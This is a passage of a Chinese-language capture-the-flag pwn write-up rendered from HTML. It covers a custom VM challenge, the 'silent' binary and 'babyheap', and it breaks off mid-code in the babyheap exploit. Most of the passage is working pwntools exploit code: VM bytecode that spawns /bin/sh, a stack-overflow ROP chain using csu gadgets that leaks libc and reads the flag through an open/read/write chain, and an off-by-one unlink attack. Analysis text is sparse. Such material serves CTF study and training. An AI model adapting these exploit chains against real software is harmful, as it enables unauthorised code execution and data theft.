class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LDX</span>(<span class="params">data</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xa2</span>) + p8(data) </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">STX</span>(<span class="params">offset</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0x86</span>) + p8(offset) </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LDA</span>(<span class="params">offset</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xa1</span>) + p8(offset) </span><br><span class="line">    <span class="keyword">return</span> payload   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">STA</span>(<span class="params">offset</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0x81</span>) + p8(offset) </span><br><span class="line">    <span class="keyword">return</span> payload   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ABC</span>(<span class="params">data</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0x65</span>) + p8(data)</span><br><span class="line">    <span class="keyword">return</span> payload   </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">In [5]: hex(0x10000-0x2108-0x206+0x200)</span></span><br><span class="line"><span class="string">Out[5]: &#x27;0xdef2&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += LDX(<span class="number">0xf2</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += LDX(<span class="number">0xde</span>) </span><br><span class="line">payload += STX(<span class="number">1</span>) </span><br><span class="line">payload += LDX(<span class="number">0</span>) </span><br><span class="line">payload += LDA(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xb0</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += ABC(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xf2</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += LDX(<span class="number">0xde</span>) </span><br><span class="line">payload += STX(<span class="number">1</span>) </span><br><span class="line">payload += LDX(<span class="number">0</span>) </span><br><span class="line">payload += STA(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xf3</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += LDX(<span class="number">0xde</span>) </span><br><span class="line">payload += STX(<span class="number">1</span>) </span><br><span class="line">payload += LDX(<span class="number">0</span>) </span><br><span class="line">payload += LDA(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xea</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += ABC(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xf3</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += LDX(<span class="number">0xde</span>) </span><br><span class="line">payload += STX(<span class="number">1</span>) </span><br><span class="line">payload += LDX(<span class="number">0</span>) </span><br><span class="line">payload += STA(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xf4</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += LDX(<span class="number">0xde</span>) </span><br><span class="line">payload += STX(<span class="number">1</span>) </span><br><span class="line">payload += LDX(<span class="number">0</span>) </span><br><span class="line">payload += LDA(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xfc</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += ABC(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">payload += LDX(<span class="number">0xf4</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += LDX(<span class="number">0xde</span>) </span><br><span class="line">payload += STX(<span class="number">1</span>) </span><br><span class="line">payload += LDX(<span class="number">0</span>) </span><br><span class="line">payload += STA(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;length:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">sa(<span class="string">&quot;code&quot;</span>,payload)</span><br><span class="line">sl(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.5</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">silent: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">178287750053</span>d8eedf914be6f97e8ab65e812b1b, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init_seccomp();</span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>首先我们需要一个 magic gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn2 ROPgadget --binary silent --depth <span class="number">600</span> | grep <span class="string">&quot;rbp - 0x3d&quot;</span></span><br><span class="line"><span class="number">0x0000000000400787</span> : add byte ptr [rbp - <span class="number">0x3d</span>], bl ; nop word ptr [rax + rax] ; mov esi, <span class="number">0x601010</span> ; push rbp ; sub rsi, <span class="number">0x601010</span> ; mov rbp, rsp ; sar rsi, <span class="number">3</span> ; mov rax, rsi ; shr rax, <span class="number">0x3f</span> ; add rsi, rax ; sar rsi, <span class="number">1</span> ; je <span class="number">0x4007c8</span> ; mov eax, <span class="number">0</span> ; test rax, rax ; je <span class="number">0x4007c8</span> ; pop rbp ; mov edi, <span class="number">0x601010</span> ; jmp rax</span><br><span class="line"><span class="number">0x00000000004007e8</span> : add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line"><span class="number">0x00000000004007e3</span> : add eax, <span class="number">0x20084f</span> ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line"><span class="number">0x00000000004007e6</span> : <span class="keyword">and</span> byte ptr [rax], al ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line"><span class="number">0x00000000004007e1</span> : inc esi ; add eax, <span class="number">0x20084f</span> ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; ret</span><br></pre></td></tr></table></figure>
<p>下面这段 gadget 是通过指令错位得来的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000004007e8</span> : add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; ret</span><br></pre></td></tr></table></figure>
<ul>
<li>将 <code>[rbp - 0x3d]</code> 中的数据加上 <code>ebx</code></li>
<li>由于我们可以控制 <code>rbp</code>，因此这段 gadget 实现了 WAA</li>
</ul>
<p>核心思路就是覆盖 stdout 上遗留的 libc_addr 为 <code>puts</code>，完成泄露以后再覆盖回来写循环</p>
<p>下一次执行 main 就可以写入 ORW 链了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./silent1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x4008FD\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x400940</span></span><br><span class="line">csu_end_addr=<span class="number">0x40095A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdx=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdi=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdi, rsi, rdx, last)</span></span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x00000000004007e8</span></span><br><span class="line">pop_rbp = <span class="number">0x0000000000400788</span></span><br><span class="line">libc_start_main_addr = <span class="number">0x600FF0</span></span><br><span class="line">stdout = <span class="number">0x601020</span></span><br><span class="line">main_addr = <span class="number">0x400879</span></span><br><span class="line">start_addr = <span class="number">0x400720</span></span><br><span class="line">bss_addr = <span class="number">0x601020</span> + <span class="number">0x200</span></span><br><span class="line">level_ret = <span class="number">0x4008FC</span></span><br><span class="line">level_ret = <span class="number">0x4008FC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x40</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(csu_end_addr)+p64(<span class="number">0xffffffffffc94210</span>)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0x1b5ef80</span>+stdout)+p64(libc_start_main_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(magic_addr)</span><br><span class="line">payload += p64(pop_rbp) + p64(<span class="number">0xffffffffffc94210</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(csu_front_addr)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(<span class="number">0x36bdf0</span>)</span><br><span class="line">payload += p64(stdout+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_addr)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;payload len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21ba0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line"></span><br><span class="line">open_libc = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_libc = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_libc = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x40</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(read_libc)</span><br><span class="line"><span class="comment"># open(bss_addr,0)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_libc)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(read_libc)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(write_libc)</span><br><span class="line">success(<span class="string">&quot;payload len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.38</span><span class="number">-1u</span>buntu6)</span> stable release version 2.38.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babyheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">6b</span>74874314aed94f7f0bb37f33a1aace975e2491, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>在 <code>dele show edit</code> 中的 <code>chunk_list</code> 和 <code>size_list</code> 有溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt; <span class="number">0x11</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( chunk_list[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">    chunk_list[index] = <span class="number">0LL</span>;</span><br><span class="line">    size_list[index] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有 off-by-one 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;code, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( code == <span class="number">0xA</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  buf[i] = code;</span><br><span class="line">&#125;</span><br><span class="line">buf[i] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用 off-by-one 可以打 unlink attack，进而泄露 heap_base 和 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&quot;easier\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">fake_heap_addr = heap_base + <span class="number">0x2c0</span> </span><br><span class="line">payload = p64(<span class="number">0</span>)+ p64(<span class="number">0xc61</span>)</span><br><span class="line">payload += p64(fake_heap_addr+<span class="number">0x18</span>)+p64(fake_heap_addr+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_heap_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,payload)  <span class="comment">#0</span></span><br><span class="line">add(<span 